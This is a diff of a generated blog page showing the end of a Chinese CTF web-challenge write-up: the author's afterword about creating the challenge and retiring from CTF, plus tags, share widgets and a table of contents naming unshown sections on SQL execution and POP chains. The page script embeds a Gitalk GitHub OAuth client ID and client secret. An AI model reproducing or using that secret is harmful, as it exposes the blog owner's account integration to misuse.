+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>题目出完后预估难度中上，但没想到把大家都卡住了… 可能这个题很难一眼看出整个解题的思路，所以放了hint避免选手走歪了。出题不易，耗费了将近一周的时间，只希望大家玩的开心。</p>
+<p>这次比赛后自己也算是正式退役了hhh，以后基本也不会再打比赛了（跟着TD摸鱼DEFCON真香）。回想自己这将近三年半的CTF经历，真是感慨万千。</p>
+<p>直至现在，最开始每次比赛自己准时打开电脑兴致冲冲打开题目，然后毫无思路最后关闭电脑的画面依然历历在目。当时的NEX断层非常严重，学长忙毕业、找工作、考研等等，作为新人的我们几乎是全靠自己摸索前进。</p>
+<p>后来大二下暑假参加XMan夏令营，才算是真正入门CTF，认识了小西、博栋、iromise等等厉害的师傅们，也认识了一群热爱CTF、热爱安全的小伙伴，还有欣蕾、扣肉这些带给我很大帮助的朋友们，这是我在XMan夏令营最大的收获。到后面与cxc，t1an5t这些NEX的小伙伴一起参加大大小小的比赛，才逐渐成长起来。</p>
+<p>再到后来，自己保研进THU加入Redbud，进来后发现学长基本都退了。在种种外界因素影响下，战队同样面临巨大的断层问题，战队甚至无法保证每个方向有1-2个活跃人员。所幸我们通过招新成功招来思齐（@mcfx）和脑王（@nano）这样的神仙选手，加上xuanxuan、hustcw等小伙伴，几个人艰难支撑着Redbud。我们在212奋战的时候最常感慨的就是，别的战队人怎么这么多，怎么这么厉害hhh。惊奇的是，在大部分高校战队被卷死，联队为王的环境下，我们还取得了不错的成绩（当然大部分功劳可能还是mcfx和nano），但Web方向依然很挣扎，很多时候基本是我一人自闭。</p>
+<p>对于CTF，吸引我的除了金钱、四处旅游等物质奖励，更多的是逼迫自己快速学习以及解出一道题时的快感。在我开始打CTF的时候，CTF是迅速入门安全的较好方式，但现在CTF尤其国内越来越卷，已经几乎成了劝退安全最好的方式了。加之现在CTF圈各方面鱼龙混杂，对于新人来说入门CTF就好像踏入了商场一样。之前陆队@Zeddy发过一个讨论CTF价值观的话题，我个人的感受是CTFer应该享受CTF，享受比赛的乐趣，攻防的快感，解题的成就感等等，不要把CTF当成安全的全部，也不要为了CTF而CTF，那样自己会越来越累，并且毫无收获。</p>
+<p>到如今，一方面自己老了熬不动夜了，比赛也逐渐跟不上节奏了；一方面自己毕业压力也很大（论文太难了要毕不了业了orz），再坚持下去，自己可能也变成“为了CTF而CTF”了。今后自己需要专注于毕业，找工作这些事情了。最后希望更多的人能享受CTF，也希望Redbud能够传承下去屹立不倒hhh。</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i><i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -197,72 +291,15 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
         		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/Web//" class="article-tag-list-link color4">Web</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
         		</li>
       		
 		</ul>
 	</div>
 
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/05/%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" class="archive-article-date">
-  	<time datetime="2018-11-05T02:32:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/05/%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/">2018 上海市大学生网络安全大赛题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Crypto</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -274,272 +311,173 @@
         		<li class="article-tag-list-item">
         			<a href="/categories/CTF/wp//" class="article-tag-list-link color3">wp</a>
         		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/CTF/wp/Web//" class="article-tag-list-link color4">Web</a>
+        		</li>
       		
 		</ul>
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAAByElEQVR42u3aW27DIBAF0Ox/0+4CKpN7wVCrOnxVjcMc5wPNg88nXtevdffM3fN3n352LFxc3GXuNVxj7t1/8k9zAy4u7nlucjDN0dv9v9hwcXFfz40CDLMUXFzc/81dKX5wcXHfyU0C3G3RPpkUVw/Uari4uAvcvEu57+8t/V1cXNwp7lWuNqEZf7eOjouLe4S70shoW59zBxkuLu5fccdtiKQISQYtSZR8B1xc3N3cvAHRti3aFmoUBRcXdzN3ZRyyMnqZG97g4uKe4SZHVR4yfyb/OaLiBxcXdxt3rgG68hrj46xoiODi4j7KTUqR9spF3mTJ06bbyQ8uLu42bn7xIkk+8rQmb5Xi4uKe5LbDknGy0r78ZPGDi4t7hJsUPEkZk4d84IoGLi7uZu4cNElf2qsVUVxcXNwXcFdGpHPznKL4wcXF3cxdv04x13jNGzG4uLhnuFe56sltwCp2wMXFPcKd27r91vqYtn4ZXFzcZW5b8LSB2zHMlwMOFxf3IHflGMoHqCuDWFxc3Ddz2zZoXj4VFRsuLu7LuG0zNBm+FkJcXNyD3Pz6RZuszA1XJmfCuLi4D3FXWp9t6tP+EEv9XVxc3BnuDzxvcbC+p3FYAAAAAElFTkSuQmCC" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/22/2018-HITCON-On-my-Raddit/" class="archive-article-date">
-  	<time datetime="2018-10-22T07:00:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-22</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/28/2021-0CTF-FINAL/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2021 0CTF FINAL wp</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/22/2018-HITCON-On-my-Raddit/">2018 HITCON On my Raddit</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Crypto</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/Web//" class="article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">出题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8FSQL%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.</span> <span class="toc-text">执行任意SQL语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98POP%E9%93%BE"><span class="toc-number">2.2.</span> <span class="toc-text">挖掘POP链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">2.3.</span> <span class="toc-text">寻找触发点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">3.</span> <span class="toc-text">写在最后</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/15/2018-%E6%8A%A4%E7%BD%91%E6%9D%AF/" class="archive-article-date">
-  	<time datetime="2018-10-15T11:20:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/15/2018-%E6%8A%A4%E7%BD%91%E6%9D%AF/">2018 护网杯 wp</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Crypto</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
+        
+    </div>
+</aside>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/05/2018CSAW/" class="archive-article-date">
-  	<time datetime="2018-10-05T05:54:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/05/2018CSAW/">2018 CSAW</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Crypto</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Misc</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/03/PHPsession/" class="archive-article-date">
-  	<time datetime="2018-10-03T06:32:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/03/PHPsession/">PHP session 反序列化</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PHP</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/Web//" class="article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/Web/PHP//" class="article-tag-list-link color4">PHP</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/tags/Web/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/tags/Web/">1</a><a class="page-number" href="/tags/Web/page/2/">2</a><span class="page-number current">3</span>
-    </nav>
   
 
+  
 
+  
+
+<!--显示阅读次数-->
+
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+            阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
+
+<!--显示阅读次数完毕-->
+
+  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+
+if(true){
+  var gitalk = new Gitalk({
+    clientID: '5ab59c2cc52f757f5565',
+    clientSecret: 'eb10e2d6c45268ab3644905f1a4d103490a346e3',
+    repo: 'gml-sec.github.io',
+    owner: 'gml-sec',
+    admin: ['gml-sec'],
+    id: 'Sun Feb 20 2022 16:37:20 GMT+0800',
+    distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+
+  
+
+<!--简书外链-->
+<script>
+var link="";
+var a = document.getElementsByTagName('img');
+for(i=0;i<a.length;i++){
+        if((a[i].src).indexOf("jianshu") > 0){
+        a[i].referrerPolicy='no-referrer';
+        link = a[i].src;
+        a[i].src = link+'?t='+Math.random();
+        }
+}
+</script>
           </div>
         </div>
       </div>
@@ -560,9 +498,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
